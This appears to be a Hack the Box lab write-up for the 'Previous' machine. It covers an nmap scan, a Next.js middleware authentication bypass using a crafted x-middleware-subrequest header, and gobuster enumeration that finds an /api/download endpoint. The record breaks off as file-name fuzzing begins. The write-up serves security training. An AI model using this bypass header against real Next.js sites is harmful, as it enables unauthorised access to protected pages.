# Hack the Box - Previous - Writeup


1, Running nmap scan

`$ nmap -p- -A -sCV 10.129.242.162 -oN nmap.txt`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 01:44 EST
Nmap scan report for previous.htb (10.129.242.162)
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   37.15 ms 10.10.14.1
2   37.21 ms previous.htb (10.129.242.162)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.37 seconds
```
Ports 22 and 80 are open and also can see the domain name. 

2. Add to the /etc/hosts

`$ sudo nano /etc/hosts`

```
127.0.0.1       localhost
10.129.242.162 previous.htb
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

3. Visit the browser. We can see a 'Get Started'. 

<img width="1916" height="547" alt="image" src="https://github.com/user-attachments/assets/00d3e54c-761f-44f5-9da2-5bc5d32b4605" />

The URL has something different. The callback URL from the API points to an internal resource.

<img width="1914" height="802" alt="image" src="https://github.com/user-attachments/assets/383b82b4-3718-4776-9e2c-87dc399ea663" />

Enumerate the web and framework using Wappalyzer

<img width="497" height="545" alt="image" src="https://github.com/user-attachments/assets/e370d47d-5ccf-4cfb-960f-46040ecd55a8" />

Searching for an exploit

Searchbar `next.js 15.2.2` -> Exploitdb

<img width="1898" height="821" alt="image" src="https://github.com/user-attachments/assets/de906689-9ac3-4715-982f-0d5b275cd76b" />

Click to this link:  https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/

<img width="1529" height="749" alt="image" src="https://github.com/user-attachments/assets/6b78a3a0-1463-4800-84f4-d313516166d2" />

Scroll down to this part

`x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware`

<img width="1083" height="312" alt="image" src="https://github.com/user-attachments/assets/45bb82be-b757-4c3f-a2a2-df90195bb98c" />

3. Burp Suite

Find the request and send it to repeater. Modify the request.

<img width="1590" height="551" alt="image" src="https://github.com/user-attachments/assets/a433b4a3-4fcf-44c4-92b8-17692db7e51f" />

<img width="628" height="423" alt="image" src="https://github.com/user-attachments/assets/905ee27b-fde9-4f34-83bb-98ef97a9e2f6" />

<img width="1605" height="795" alt="image" src="https://github.com/user-attachments/assets/3fabff05-4afb-4a49-8170-e525d60248a1" />

It works we are able to bypass the auth. Go back to the proxy and send the request again with modifications. 

Intercept in Burp Suite

<img width="1591" height="789" alt="image" src="https://github.com/user-attachments/assets/8622e261-c216-4b0b-82b5-3cbb714ed818" />

It will bring to this page. Click around. 

<img width="1910" height="764" alt="image" src="https://github.com/user-attachments/assets/09d68135-1ca4-4a22-89e4-9a672c012003" />

Inside the docs we don’t see anything. Try to to find hidden directory listings. 

`gobuster dir -u http://previous.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster.txt`

```
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 308) [Size: 71] [--> /%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]                                                                 
/docs                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
/api                  (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]   <-------------- here
/signin               (Status: 200) [Size: 3481]
```

Lets try to find more about the `/api` directory.

`$ gobuster dir -u http://previous.htb/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusetr.txt -t 50 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'`

```
Progress: 9327 / 220559 (4.23%)Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/api/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 28]  <---------------------- here
```
We found /download.

Go back to burp in repeater and see if the endpoint is reachable.

<img width="673" height="230" alt="image" src="https://github.com/user-attachments/assets/47375f05-c23b-4282-aed5-c2d430bf7954" />

Invalid Filename. It means filename is not in our parameter, we need to fuzz it.

`

















